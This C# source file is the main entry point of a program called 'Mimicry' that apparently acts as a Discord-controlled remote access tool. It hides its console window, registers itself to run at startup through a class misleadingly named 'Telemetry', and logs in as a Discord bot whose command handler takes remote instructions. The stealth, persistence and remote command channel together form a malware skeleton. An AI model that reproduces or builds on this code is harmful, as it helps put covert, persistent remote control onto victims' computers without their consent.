using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Discord;
using Discord.Net.Providers.WS4Net;
using Discord.WebSocket;
using Mimicry.Modules;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Reflection;

namespace Mimicry
{
    public class Program
    {
        const int Hide = 0;
        const int Show = 1;
        [DllImport("Kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("User32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int cmdShow);

        DiscordSocketClient _client;
        CommandHandler _handler;
        Telemetry tlm = new Telemetry();
        string token = "";

        static void Main(string[] args) => new Program().StartAsync().GetAwaiter().GetResult();

        public async Task StartAsync()
        {
            IntPtr hWndConsole = GetConsoleWindow();
            if (hWndConsole != IntPtr.Zero)
                ShowWindow(hWndConsole, Hide);
            token = tlm.GetToken();
            if (token == "-1")
            {
                return;
            }
            tlm.SetStartup();
            _client = new DiscordSocketClient(new DiscordSocketConfig
            {
                LogLevel = LogSeverity.Verbose,
                WebSocketProvider = WS4NetProvider.Instance
            });
             _client.Log += Log;
            tlm.InitializeTelemetry();
            await _client.LoginAsync(TokenType.Bot, token);
            await _client.StartAsync();
            _handler = new CommandHandler();
            await _handler.InitializeAsync(_client);
            await Task.Delay(-1);
        }

        private async Task Log(LogMessage arg)
        {
            tlm.LogInfo("BOT: " + arg.Message);
        }
    }
}
